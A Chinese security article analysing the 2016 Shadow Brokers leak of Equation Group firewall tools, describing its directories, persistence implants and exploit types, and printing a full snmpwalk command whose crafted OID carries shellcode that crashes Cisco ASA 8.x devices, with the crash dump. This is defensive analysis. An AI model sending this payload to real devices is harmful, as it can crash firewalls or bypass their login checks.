> 原文链接: https://www.anquanke.com//post/id/84419 


# 8月19日：Shadow-Brokers所泄露文件的介绍、技术分析（上）


                                阅读量   
                                **167698**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



**[![](https://p2.ssl.qhimg.com/t017eddd82532cb29ef.png)](https://p2.ssl.qhimg.com/t017eddd82532cb29ef.png)**

**0x01 曝光的数据与方程式和NSA的关系**

从泄露数据包所解压出的内容看，是专门针对防火墙设备进行攻击和渗透行动时所使用的工具集。据数据曝光者Shadow Brokers所描述，这个数据包是来自于著名国家级APT攻击团队——方程式组织(Equation Group)。该组织具信受雇于美国国家安全局(NSA),对外发动过多次著名的国家级APT攻击，包括震网(stuxnet)、Regin、Flame等攻击。从文件中所包含有”JETPLOW“,”BANANALEE“等文件名和文件夹关键字信息, 也与之前斯诺登所曝光的NSA网络攻击内部资料的防火墙(FIREWALL)章节内容所相符:

下图为斯诺登报出的NSA网络攻击的一节内容:

[![](https://p1.ssl.qhimg.com/t010d3f98498e161f5f.png)](https://p1.ssl.qhimg.com/t010d3f98498e161f5f.png)

(JETPLOW是专门针对Cisco PIX和ASA系列防火墙固件进行持久化植入的工具，可以将持久化控制软件BANANAGLEE植入到设备中)

[![](https://p1.ssl.qhimg.com/t01b3cb65f190079e70.png)](https://p1.ssl.qhimg.com/t01b3cb65f190079e70.png)

(BANANAGLEE可以认为是一个持续控制后门(Persistent Backdoor)攻击框架, 通过植入和篡改Cisco防火墙OS文件, 实现对Cisco防火墙入侵后的持续控制)

    通过各安全研究人员对工具集当中攻击工具的成功验证, 基本上确定了这些数据包是从NSA有关联的方程式组织(Equation Group)泄露的可能性;

**0x02 工具包所包含内容的分析:**

文件夹下的目录信息

[![](https://p3.ssl.qhimg.com/t0122b07979b1b0b58a.png)](https://p3.ssl.qhimg.com/t0122b07979b1b0b58a.png)

**padding 文件**

大小19M, 使用binwalk对文件进行分析后发现有Cisco IOS特征,推测应该是Cisco IOS平台的OS文件,可能是在攻击行为中留下了的;



```
root@kali:~/Documents/test/Firewall# binwalk padding
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
10909743      0xA6782F        Cisco IOS experimental microcode for ""
```



**SCRIPTS/ 目录 **

该应该是攻击行动执行组(OPS)在攻击过程中的笔记和一些攻击工具的使用方法笔记; 文件的最后修改时间为2013年6月份;

[![](https://p1.ssl.qhimg.com/t0163cc5486ec8938dd.png)](https://p1.ssl.qhimg.com/t0163cc5486ec8938dd.png)

(文件名称和内容描述)

其中:

Bookishmute.txt 文件为一次针对TOPSEC防火墙的攻击记录笔记。记录中出现的IP地址159.226.209.125为中国科学网的IP，怀疑该OPS小组有对中国相关组织进行过攻击;

**TOOLS/ 目录**

主要用来存放一些进行渗透行动(OPS)时所经常用到的工具;

[![](https://p2.ssl.qhimg.com/t01280af410dfb1509b.png)](https://p2.ssl.qhimg.com/t01280af410dfb1509b.png)

**OPS/  目录**

进行攻击行动(OPS)时的自动化工具集合

[![](https://p3.ssl.qhimg.com/t0186abbcddfb0a7281.png)](https://p3.ssl.qhimg.com/t0186abbcddfb0a7281.png)

**BUZZDIRECTION/ 目录**

针对Fortinet的持久化植入和控制工具集合

[![](https://p3.ssl.qhimg.com/t01045042541829de51.png)](https://p3.ssl.qhimg.com/t01045042541829de51.png)

**BANANAGLEE 目录:**

是针对ASA和PIX设备的可持续控制功能, 目的是在获取防火墙权限后,能够实现对设备的持久控制, 并根据不通模块完成对应的任务; 如任意流量调度，对感兴趣的流量进行监听等。

[![](https://p0.ssl.qhimg.com/t01130db272fbfb3784.png)](https://p0.ssl.qhimg.com/t01130db272fbfb3784.png)

**EXPLOIT/ 目录**

利用防火墙设备的漏洞,实现对不同防火墙(ASA,PIX,NETSCREE,TOPSEC,Fortinet)的”破门”,以期望达到获取防火墙控制权限的目的;

从整个文件中的目录结构和内容信息来分，可以大体上分为三类:

一类为脚本,记录和自动化工具文件, 主要分布在OPS,SCRIPTS,TOOLS目录下; 

第二类为利用漏洞进行破门的工具, 主要是EXPLOIT目录,针对不同的目标,攻击程序在不同的子文件夹中;

第三类是为了能对目标防火墙设备持续控制和进行有目的的信息采集,而准备的工程化工具,主要集中在BANANAGLEE,BARGLEE,BLASTING,BUZZDIRECTION目录下;

[![](https://p4.ssl.qhimg.com/t016cbc13a5c4a638f5.png)](https://p4.ssl.qhimg.com/t016cbc13a5c4a638f5.png)

**0x03 漏洞利用分析**

从攻击的代码看, 针对TOPSEC所使用漏洞类型,为防火墙通过web所提供的管理界面中存在的漏洞,一个是HTTP Cookie command injection漏洞, 一个是HTTP POST 命令注入漏洞; Fortigate防火墙则是由于HTTP cookie溢出而存在漏洞。

目前完成验证的则是EXTRA BACON工具集中, 所使用的影响ASA 8.0-8.4版本的[SNMP溢出漏洞](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160817-asa-snmp);

当一台ASA设备配置了snmp口令比较弱或被泄露, 那么攻击者可以从ASA允许的snmp-server上通过精心构造的snmp溢出数据包, 实现对ASA设备telnet和ssh登陆密码验证的绕过;

攻击视频为: [http://v.youku.com/v_show/id_XMTY4NzgxNTM0MA==.html](http://v.youku.com/v_show/id_XMTY4NzgxNTM0MA==.html)



通过分析攻击工具所构造的的数据信息发现,能够实现针对ASA设备溢出攻击的有效SNMP串, 可以造成ASA设备的crash。

能造成ASA设备重启的SNMP代码如下:

```
snmpwalk -v 2c -t 1 -r 0 -c $community $target_ip 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.57.64.28.173.53.165.165.165.165.131.236.4.137.4.36.137.229.131.197.88.49.192.49.219.179.16.49.246.191.174.170.170.170.129.247.165.165.165.165.96.139.132.36.216.1.0.0.4.51.255.208.97.195.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.144.253.13.54.9.139.124.36.20.139.7.255.224.144
```



**造成Crash的ASA信息如下:**



```
Cisco Adaptive Security Appliance Software Version 8.2(5)
Compiled on Fri 20-May-11 16:00 by builders
Hardware:   ASA5505
Crashinfo collected on 02:45:02.149 UTC Tue Aug 16 2016
Traceback:
0: 0x805e2d3
1: 0x805ede7
2: 0x8a63c84
3: 0xdd6aa6d5
4: 0xdd57d1e0
5: 0xc9a647f8
6: 0xc9bbb648
Stack dump: base:0x0xc9a646b4 size:351267, active:351267
 entries above '==': return PC preceded by input parameters
 entries below '==': local variables followed by saved regs
             '==Fn': stack frame n, contains next stack frame
                '*': stack pointer at crash
 For example:
    0xeeeeef00: 0x005d0707     : arg3
    0xeeeeeefc: 0x00000159     : arg2
    0xeeeeeef8: 0x005d0722     : arg1
    0xeeeeeef4: 0x005d1754     : return PC
    0xeeeeeef0: 0xeeeeef20 ==F2: stack frame F2
    0xeeeeeeec: 0x00def9e0     : local variable
    0xeeeeeee8: 0x0187df9e     : local variable or saved reg
    0xeeeeeee4: 0x01191548     : local variable or saved reg ciscoasa#
Thread Name: snmp
Page fault: Address not mapped
    vector 0x0000000e
       edi 0x0f0f0f0b
       esi 0x00000000
       ebp 0xc9a647b4
       esp 0xc9a64738
       ebx 0x00000010
       edx 0xc9a6472c
       ecx 0xc911d4e8
       eax 0x023d0d4c
error code 0x00000004
       eip 0xc9bbae4a
        cs 0x00000073
    eflags 0x00013203
       CR2 0x023d0d68
```

**<br>**

**0x04 持续化后门程序分析**

待续

**<br>**

**0x05 总结**



通过对目前所掌握的Shadow-brokers所泄露出文件的分析,可以得到如下结论:

1.是专门执行对防火墙(Firewall)设备进行渗透攻击,并高度集成的攻击工具集;

2.该工具集覆盖了国内外使用比较广泛的防火墙产品;

3.破门攻击(利用漏洞获取防火墙权限)时所使用的设备软件漏洞,需要对设备漏洞进行主动的挖掘才能获取;

4.准确可靠的漏洞利用程序(EXPLOIT)说明安全技术达到了极高的水平,有专门人员从事对网络设备安全的研究;

5.获取目前权限后的持续控制和隐秘, 攻击方基本上已经形成了框架和比较统一的思路;
